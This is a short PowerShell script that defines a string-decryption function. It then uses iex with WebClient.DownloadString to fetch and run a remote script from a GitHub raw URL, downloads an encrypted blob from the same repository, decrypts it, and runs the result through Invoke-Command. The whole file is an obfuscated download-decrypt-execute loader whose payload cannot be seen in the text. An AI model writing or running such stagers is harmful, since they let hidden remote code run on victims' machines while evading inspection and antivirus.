Function Decrypt-String{
Param(
    [Parameter(
        Mandatory=$True,
        Position=0,
        ValueFromPipeLine=$true
    )]
    [Alias("String")]
    [String]$EncryptedString,

    [Parameter(
        Mandatory=$True,
        Position=1
    )]
    [Alias("Key")]
    [byte[]]$EncryptionKey
)
    Try{
        $SecureString = ConvertTo-SecureString $EncryptedString -Key $EncryptionKey
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
        [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

        $data = @()
        #[convert]::FromBase64String($encodedCommand) | ForEach-Object{
        [convert]::FromBase64String($String) | ForEach-Object{
            If($_ -ne 0){
                $data += [char]$_
            }
        }

        Return ($data -join '')
    }
    Catch{Throw $_}
}
# Load $KEY from https://raw.githubusercontent.com/sroseberry/FunScripts/main/RandomGarbage.ps1
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sroseberry/FunScripts/main/RandomGarbage.ps1'))
# Load Encrypted file from https://raw.githubusercontent.com/sroseberry/FunScripts/main/RandomGarbage.txt
$EncryptedString = ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sroseberry/FunScripts/main/RandomGarbage.txt'))
$aString = $EncryptedString | Decrypt-String -EncryptionKey $Key
$scriptBlock = [Scriptblock]::Create($aString)
Invoke-Command -ScriptBlock $scriptBlock
